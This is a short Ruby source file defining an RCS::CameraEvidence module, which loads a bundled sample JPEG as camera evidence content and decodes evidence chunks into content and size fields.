require 'rcs-common/evidence/common'

module RCS

module CameraEvidence
  
  def content
    path = File.join(File.dirname(__FILE__), 'content', 'camera', '001.jpg')
    File.open(path, 'rb') {|f| f.read }
  end
  
  def generate_content
    [ content ]
  end
  
  def decode_content
    @info[:content] = @info[:chunks].first
    @info[:size] = @info[:content].size
    return [self]
  end
end

end # ::RCS